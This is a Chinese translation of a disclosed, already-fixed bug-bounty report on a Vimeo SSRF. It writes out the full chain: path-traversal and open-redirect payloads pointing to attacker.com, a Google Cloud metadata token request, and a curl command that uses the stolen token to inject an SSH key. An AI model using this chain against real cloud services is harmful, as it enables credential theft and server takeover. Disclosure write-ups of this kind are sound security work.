@@ -1,0 +1,143 @@
+***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**
+
+ ****
+**本文分享的是一个关于视频网站Vimeo的SSRF漏洞（服务端请求伪造），可以利用开放重定向和谷歌云实例token获取两种方法，实现Vimeo服务端代码执行，危害严重。**
+
+ **
+**![](https://image.3001.net/images/20190311/1552311514_5c8664dadd568.jpg!small)****
+
+## 漏洞背景
+
+Vimeo在网站<https://developer.vimeo.com>上部署了一个名为API
+Playground的API接口，对该网站发起的请求是都是针对服务端的，例如以下的错误：
+
+![](https://image.3001.net/images/20190311/1552310675_5c866193bfc77.png!small)仔细观察上述POST请求，可以发现，其中包含了一个面向服务端的GET请求，该请求可以简单抽象如下：
+
+> <https://api.vimeo.com/users/>{user_id}/videos/{video_id}  
+>
+
+在这个抽象出来的请求中，可以发现，我们可以控制的参数有很多。首先当然是URI参数，也就是其中的/users/{user_id}/videos/{video_id}，这里的请求方法是GET，如果请求方法是POST的话，其参数对应的也可以设置为post参数。user_id
+和 video_id是两个变量值，其值可在segments中被定义。
+
+## 服务端目录遍历
+
+我尝试着在URI参数中进行一些常用目录的遍历，然而几经测试都返回了403状态，也就是说，服务端其实已经理解了该请求，但却拒绝执行它。但是，我想因为user_id
+&
+videos_id也是包含在URL中的，且应该是服务端的内部参数，所以如果对它们做出更改应该是可行的。最终，测试发现，通过利用../../../这种形式的URL，可以形成一个针对api.vimeo.com服务端的ROOT级别请求，如下：
+
+![](https://image.3001.net/images/20190311/1552310770_5c8661f261b02.png!small)大概意思就是，如果构造的GET请求如下：
+
+> URL.parse(“<https://api.vimeo.com/users/1122/videos/../../../attacker>”)
+
+则最终响应请求的就会是
+<https://api.vimeo.com/attacker>页面。在上图中，可以看到，如果其构造的请求是经认证过的，那么最终在响应消息中，api.vimeo.com所有可能的响应都会被列出来。
+
+## 通过api.vimeo.com进行提权
+
+考虑了一会，我觉得这种机制应该是遵循HTTP
+30X重定向的，说来话长。所以，知道了这点，我们就可以构造一个开放重定向方式，让Vimeo服务端跳转到我们控制的资源上去。
+
+### 发现突破口
+
+经过研究，我发现在api.vimeo.com上某个服务端，可以跳转到主站vimeo.com上去：
+
+![](https://image.3001.net/images/20190311/1552311241_5c8663c91ca83.png!small)
+
+> <https://api.vimeo.com/m/something>
+
+可以跳转到：
+
+> <https://vimeo.com/m/something>
+
+大概思路也就是：
+
+>
+> <https://api.vimeo.com/m/something/..../open/redirect?url=https://vimeo.com/m/something>
+
+那如果我们把redirect?url=后的vimeo.com换成我们控制的网站，不就可以了吗？所以，基于这个发现，我们就有了一个很大的范围去寻找这么一个能成功跳转的api.vimeo.com服务端，在该漏洞报告中，最终我发现了一个不太有效的跳转服务端，此处为了保密考虑，我只给出大概构造思路，如下：
+
+> <https://vimeo/vulnerable/open/redirect?url=https://attacker.com>
+
+最终，会成功执行一个到attacker.com的临时重定向的302跳转。
+
+## 综合利用形成SSRF
+
+最终构造出的可行Payload如下：
+
+> ../../../m/vulnerable/open/redirect?url=<https://attacker.com>
+
+结合前面的目录遍历方式，加入video_id，所以最终的跳转URL为：
+
+>
+> <https://api.vimeo.com/users/1122/videos/../../../m/vulnerable/open/redirect?url=https://attacker.com>
+
+解析后会变为：
+
+> <https://api.vimeo.com/m/vulnerable/open/redirect?url=https://attacker.com>
+
+再经重定向会变为：
+
+> <https://vimeo.com/vulnerable/open/redirect?url=https://attacker.com>
+
+最后，除了对vimeo.com服务端的请求外，也会发起一个针对<https://attacker.com>的请求，其中，vimeo.com服务端的响应消息为json格式，如下：
+
+##
+![](https://image.3001.net/images/20190311/1552311253_5c8663d553acf.png!small)其它形式的SSRF漏洞发现
+
+由于Vimeo的基础架构是部署在Google云上的，所以我第一个想到的就是分析一下Google 元数据API接口。因为早前看过André Baptista
+(@0xacb)的[利用谷歌元数据接口实现shopify实例SSRF的漏洞报告](https://hackerone.com/reports/341876)（$25,000），非常震撼，所以，在此，我就参考@0xacb的方法来对此漏洞进行利用（详细请参考[SSRF
+in Exchange leads to ROOT access in all
+instances](https://hackerone.com/reports/341876)）。大概思路是，首先请求以下链接：
+
+> <http://metadata.google.internal/computeMetadata/v1beta1/instance/service-> accounts/default/token?alt=json>
+
+它会返回一个account token：
+
+    
+    
+    { “headers”: [ “HTTP/1.1 200”, “Content-Type: application/json”, “Host: api.vimeo.com” ], “code”: 200, “body”: { “access_token”: “ya29.c.EmKeBq9XXDWtXXXXXXXXecIkeR0dFkGT0rJSA”, “expires_in”: 2631, “token_type”: “Bearer” } }
+
+这个account token具备的权限范围为：
+
+    
+    
+    $ curl <https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA>    
+    
+    
+    Response:
+    
+    { "issued_to": "101302079XXXXX", "audience": "10130207XXXXX", "scope": "<https://www.googleapis.com/auth/compute> <https://www.googleapis.com/auth/logging.write> <https://www.googleapis.com/auth/devstorage.read_write> <https://www.googleapis.com/auth/monitoring>", "expires_in": 2443, "access_type": "offline" }
+
+我可以用这个account token把我公共的SSH密钥添加到Vimeo实例中，然后再通过我的私钥去连接它，如下：
+
+    
+    
+    $ curl -X POST “<https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata>" -H “Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA” -H “Content-Type: application/json” — data ‘{“items”: [{“key”: “harsh-bugdiscloseguys”, “value”: “harsh-ssrf”}]}
+    
+    Response: 
+    
+    { “kind”: “compute#operation”, “id”: “63228127XXXXXX”, “name”: “operation-XXXXXXXXXXXXXXXXXX”, “operationType”: “compute.projects.setCommonInstanceMetadata”, “targetLink”: “<https://www.googleapis.com/compute/v1/projects/vimeo-XXXXX>", “targetId”: “10423XXXXXXXX”, “status”: “RUNNING”, “user”: “10423XXXXXXXX-compute@developer.gserviceaccount.com”, “progress”: 0, “insertTime”: “2019–01–27T15:50:11.598–08:00”, “startTime”: “2019–01–27T15:50:11.599–08:00”, “selfLink”: “<https://www.googleapis.com/compute/v1/projects/vimeo-XXXXX/global/operations/operation-XXXXXX>"}
+
+之后，就会有以下情况，可以成功连接到Vimeo在Google云上的实例：  
+
+![05.png](https://image.3001.net/images/20190311/1552311393_5c866461107bd.png!small)SSH一般只在内网开放，这也经足够说明，可以进一步提权为shell级别了。另外，还提取出了Google云中的Kubernetes密钥，但我却不懂如何用它，好在Vimeo安全团队认为它是有效的。
+
+整个漏洞发现过程就是这些，也就是存在两个方面的SSRF风险隐患。感谢André Baptista (@0xacb)厉害的漏洞报告参考，Brett
+(@bbuerhaus)关于[SSRF的writeup](https://buer.haus/2017/03/09/airbnb-chaining-third-party-open-redirect-into-server-side-request-forgery-ssrf-via-liveperson-chat/)，还有Vimeo安全团队的尽力修复。
+
+## 漏洞修复进程
+
+> 2019.1.28 漏洞初报
+>
+> 2019.1.28 HackerOne漏洞分类
+>
+> 2019.1.28 Vimeo官方前期奖励$100，并制作临时补丁
+>
+> 2019.1.28 Vimeo安全团队发布修复补丁
+>
+> 2019.2.1 Vimeo官方$4900美金奖励
+
+ ***参考来源：[medium](https://medium.com/@rootxharsh_90844/vimeo-ssrf-with-code-execution-potential-68c774ba7c1e)，clouds编译，转载请注明来自FreeBuf.COM**  
+
+ ****  
+
